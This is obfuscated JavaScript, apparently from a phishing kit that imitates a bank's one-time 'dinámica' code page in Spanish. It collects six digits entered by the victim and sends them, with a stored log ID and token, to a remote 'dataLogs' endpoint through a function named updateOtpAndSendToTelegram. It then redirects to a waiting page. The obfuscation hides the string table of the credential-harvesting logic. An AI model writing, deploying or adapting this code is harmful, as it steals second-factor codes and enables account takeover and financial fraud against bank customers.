const _0x3d5ae6 = _0x3c01;
(function (_0x1d6313, _0x3f287a) {
  const _0x4fda21 = _0x3c01,
    _0x9cf6a6 = _0x1d6313();
  while (!![]) {
    try {
      const _0x27a481 =
        (parseInt(_0x4fda21(0x102)) / 0x1) *
          (parseInt(_0x4fda21(0x12d)) / 0x2) +
        -parseInt(_0x4fda21(0x129)) / 0x3 +
        parseInt(_0x4fda21(0x11a)) / 0x4 +
        (parseInt(_0x4fda21(0x10d)) / 0x5) *
          (parseInt(_0x4fda21(0x11d)) / 0x6) +
        parseInt(_0x4fda21(0x120)) / 0x7 +
        (-parseInt(_0x4fda21(0x10c)) / 0x8) *
          (-parseInt(_0x4fda21(0x113)) / 0x9) +
        (parseInt(_0x4fda21(0x118)) / 0xa) *
          (-parseInt(_0x4fda21(0x10a)) / 0xb);
      if (_0x27a481 === _0x3f287a) break;
      else _0x9cf6a6["push"](_0x9cf6a6["shift"]());
    } catch (_0x2613a2) {
      _0x9cf6a6["push"](_0x9cf6a6["shift"]());
    }
  }
})(_0x162a, 0x4d6b4);
function updateLS() {
  const _0x1b3dca = _0x3c01;
  LS[_0x1b3dca(0x11b)]("info", JSON[_0x1b3dca(0x126)](info));
}
function _0x162a() {
  const _0x2acce0 = [
    "location",
    "href",
    "json",
    "8dtEPPu",
    "dataLogToken",
    "metaInfo",
    "58231UOCzOm",
    "getElementById",
    "Por\x20favor\x20ingrese\x20los\x20datos",
    "cdin",
    "dataLogId",
    "Error\x20en\x20la\x20solicitud:",
    "origin",
    "log",
    "487553NYBLRL",
    "value",
    "4599184FTESvM",
    "297285wobmYl",
    "number-4",
    "error",
    "click",
    "btn-consultar",
    "PUT",
    "9IswugW",
    "./wait.html",
    "addEventListener",
    "number-3",
    "focus",
    "230RqQoAr",
    "number-2",
    "637348sjtyze",
    "setItem",
    "getItem",
    "42uBOPCj",
    "Hubo\x20un\x20error.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "3398857fsaxpK",
    "preventDefault",
    "Datos\x20actualizados\x20en\x20el\x20servidor",
    "number-5",
    "Bearer\x20",
    "number-6",
    "stringify",
    "disabled",
    "number-1",
    "1597116LEpyUn",
  ];
  _0x162a = function () {
    return _0x2acce0;
  };
  return _0x162a();
}
async function updateOtpAndSendToTelegram() {
  const _0x29f8b7 = _0x3c01,
    _0x4f486a = document[_0x29f8b7(0x103)](_0x29f8b7(0x111));
  _0x4f486a[_0x29f8b7(0x127)] = !![];
  try {
    const _0x1ebada = localStorage[_0x29f8b7(0x11c)](_0x29f8b7(0x106)),
      _0x3cb7ca = localStorage[_0x29f8b7(0x11c)](_0x29f8b7(0x12e));
    if (!_0x1ebada || !_0x3cb7ca)
      throw new Error(
        "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
      );
    const _0x4b3a9b = await fetch(
      url + "/dataLogs/updateDinDataLog/" + _0x1ebada,
      {
        method: _0x29f8b7(0x112),
        headers: {
          "Content-Type": "application/json",
          Authorization: _0x29f8b7(0x124) + _0x3cb7ca,
          Origin: window[_0x29f8b7(0x12a)][_0x29f8b7(0x108)],
        },
        body: JSON[_0x29f8b7(0x126)]({
          din: info[_0x29f8b7(0x12f)][_0x29f8b7(0x105)],
          status: "Ingresó\x20dinámica",
        }),
      }
    );
    if (!_0x4b3a9b["ok"]) {
      const _0x2b5fee = await _0x4b3a9b[_0x29f8b7(0x12c)]();
      throw new Error(_0x2b5fee[_0x29f8b7(0x10f)] || _0x29f8b7(0x11f));
    }
    console[_0x29f8b7(0x109)](_0x29f8b7(0x122)),
      (window[_0x29f8b7(0x12a)][_0x29f8b7(0x12b)] = _0x29f8b7(0x114));
  } catch (_0x177db3) {
    console[_0x29f8b7(0x10f)](_0x29f8b7(0x107), _0x177db3),
      alert(_0x29f8b7(0x11e));
  } finally {
    _0x4f486a[_0x29f8b7(0x127)] = ![];
  }
}
function _0x3c01(_0x4edaca, _0x334f01) {
  const _0x162a87 = _0x162a();
  return (
    (_0x3c01 = function (_0x3c0177, _0x3a2683) {
      _0x3c0177 = _0x3c0177 - 0x102;
      let _0x21085e = _0x162a87[_0x3c0177];
      return _0x21085e;
    }),
    _0x3c01(_0x4edaca, _0x334f01)
  );
}
document[_0x3d5ae6(0x103)](_0x3d5ae6(0x111))[_0x3d5ae6(0x115)](
  _0x3d5ae6(0x110),
  function (_0x1bc68) {
    const _0x1f7f39 = _0x3d5ae6;
    _0x1bc68[_0x1f7f39(0x121)]();
    if (
      document[_0x1f7f39(0x103)](_0x1f7f39(0x128))[_0x1f7f39(0x10b)] == "" ||
      document["getElementById"](_0x1f7f39(0x119))["value"] == "" ||
      document[_0x1f7f39(0x103)]("number-3")["value"] == "" ||
      document[_0x1f7f39(0x103)](_0x1f7f39(0x10e))[_0x1f7f39(0x10b)] == "" ||
      document["getElementById"]("number-5")[_0x1f7f39(0x10b)] == "" ||
      document[_0x1f7f39(0x103)](_0x1f7f39(0x125))[_0x1f7f39(0x10b)] == ""
    ) {
      alert(_0x1f7f39(0x104)),
        document[_0x1f7f39(0x103)](_0x1f7f39(0x128))["focus"]();
      return;
    } else {
      const _0x1d2e91 =
        document[_0x1f7f39(0x103)](_0x1f7f39(0x128))[_0x1f7f39(0x10b)] +
        document[_0x1f7f39(0x103)](_0x1f7f39(0x119))[_0x1f7f39(0x10b)] +
        document["getElementById"]("number-3")["value"] +
        document[_0x1f7f39(0x103)](_0x1f7f39(0x10e))[_0x1f7f39(0x10b)] +
        document["getElementById"]("number-5")["value"] +
        document[_0x1f7f39(0x103)](_0x1f7f39(0x125))[_0x1f7f39(0x10b)];
      (info["metaInfo"][_0x1f7f39(0x105)] = _0x1d2e91),
        updateLS(),
        updateOtpAndSendToTelegram();
    }
  }
),
  document[_0x3d5ae6(0x103)](_0x3d5ae6(0x111))[_0x3d5ae6(0x115)](
    "click",
    function (_0x1fa995) {
      const _0x43345d = _0x3d5ae6;
      _0x1fa995[_0x43345d(0x121)]();
      if (
        document[_0x43345d(0x103)](_0x43345d(0x128))[_0x43345d(0x10b)] == "" ||
        document[_0x43345d(0x103)](_0x43345d(0x119))[_0x43345d(0x10b)] == "" ||
        document[_0x43345d(0x103)](_0x43345d(0x116))["value"] == "" ||
        document[_0x43345d(0x103)]("number-4")[_0x43345d(0x10b)] == "" ||
        document["getElementById"]("number-5")["value"] == "" ||
        document[_0x43345d(0x103)](_0x43345d(0x125))[_0x43345d(0x10b)] == ""
      ) {
        alert(_0x43345d(0x104)),
          document[_0x43345d(0x103)](_0x43345d(0x128))[_0x43345d(0x117)]();
        return;
      } else {
        const _0x5c8fc1 =
          document[_0x43345d(0x103)](_0x43345d(0x128))[_0x43345d(0x10b)] +
          document[_0x43345d(0x103)](_0x43345d(0x119))[_0x43345d(0x10b)] +
          document[_0x43345d(0x103)](_0x43345d(0x116))[_0x43345d(0x10b)] +
          document[_0x43345d(0x103)]("number-4")[_0x43345d(0x10b)] +
          document[_0x43345d(0x103)](_0x43345d(0x123))[_0x43345d(0x10b)] +
          document[_0x43345d(0x103)](_0x43345d(0x125))[_0x43345d(0x10b)];
        (info["metaInfo"][_0x43345d(0x105)] = _0x5c8fc1),
          updateLS(),
          updateOtpAndSendToTelegram();
      }
    }
  );
